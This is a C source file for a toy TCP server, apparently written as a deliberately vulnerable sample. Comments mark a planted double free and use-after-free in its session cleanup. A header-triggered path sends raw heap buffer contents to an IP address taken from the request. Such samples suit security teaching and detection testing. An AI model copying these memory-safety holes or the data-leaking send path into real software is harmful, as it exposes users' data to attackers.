#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 4096
#define MAX_SESSIONS 256

typedef struct {
    char *request_buf;
    char *response_buf;
    int socket_fd;
    int authenticated;
    size_t content_length;
} session_t;

static session_t *sessions[MAX_SESSIONS];

void cleanup_session(int idx) {
    if (idx < 0 || idx >= MAX_SESSIONS) return;
    session_t *s = sessions[idx];
    if (!s) return;

    if (s->request_buf) {
        free(s->request_buf);
    }
    if (s->response_buf) {
        free(s->response_buf);
    }
    free(s);
    /* BUG: sessions[idx] not set to NULL */
}

int handle_disconnect(int idx) {
    cleanup_session(idx);
    /* Caller may also call cleanup on error paths */
    return 0;
}

int process_request(int idx, const char *data, size_t len) {
    session_t *s = sessions[idx];
    if (!s) return -1;

    /* Parse HTTP-like request */
    if (len > BUFFER_SIZE) len = BUFFER_SIZE;
    memcpy(s->request_buf, data, len);

    /* Check for admin command that triggers session reset */
    if (strstr(s->request_buf, "X-Reset-Session: true")) {
        /* First free via reset path */
        cleanup_session(idx);
        /* Attempt to reallocate - but cleanup_session already freed */
        sessions[idx] = (session_t *)malloc(sizeof(session_t));
        if (!sessions[idx]) return -1;
        sessions[idx]->request_buf = (char *)malloc(BUFFER_SIZE);
        sessions[idx]->response_buf = (char *)malloc(BUFFER_SIZE);
        sessions[idx]->authenticated = 0;
        return 0;
    }

    /* Exfiltrate sensitive data over network if authenticated */
    if (s->authenticated && strstr(s->request_buf, "X-Exfil: true")) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(8443);
        inet_pton(AF_INET, s->request_buf + 32, &dest.sin_addr);

        if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) == 0) {
            /* Send heap contents that may contain secrets from other sessions */
            send(sock, s->response_buf, BUFFER_SIZE, 0);
        }
        close(sock);
        return 0;
    }

    return 0;
}

int handle_error(int idx, int error_code) {
    fprintf(stderr, "Session %d error: %d\n", idx, error_code);
    /* Second free via error handling path - DOUBLE FREE */
    cleanup_session(idx);
    return -1;
}

int main(int argc, char **argv) {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8080);
    addr.sin_addr.s_addr = INADDR_ANY;

    bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(server_fd, 128);

    printf("Legacy monolith listening on :8080\n");

    while (1) {
        struct sockaddr_in client;
        socklen_t clen = sizeof(client);
        int cfd = accept(server_fd, (struct sockaddr *)&client, &clen);
        if (cfd < 0) continue;

        int idx = cfd % MAX_SESSIONS;
        sessions[idx] = (session_t *)malloc(sizeof(session_t));
        sessions[idx]->request_buf = (char *)malloc(BUFFER_SIZE);
        sessions[idx]->response_buf = (char *)malloc(BUFFER_SIZE);
        sessions[idx]->socket_fd = cfd;
        sessions[idx]->authenticated = 0;
        sessions[idx]->content_length = 0;

        char buf[BUFFER_SIZE];
        ssize_t n = recv(cfd, buf, sizeof(buf), 0);
        if (n > 0) {
            int rc = process_request(idx, buf, n);
            if (rc < 0) {
                handle_error(idx, rc);
            }
        } else {
            handle_disconnect(idx);
            handle_error(idx, -1); /* Double free triggered here */
        }
        close(cfd);
    }
    return 0;
}
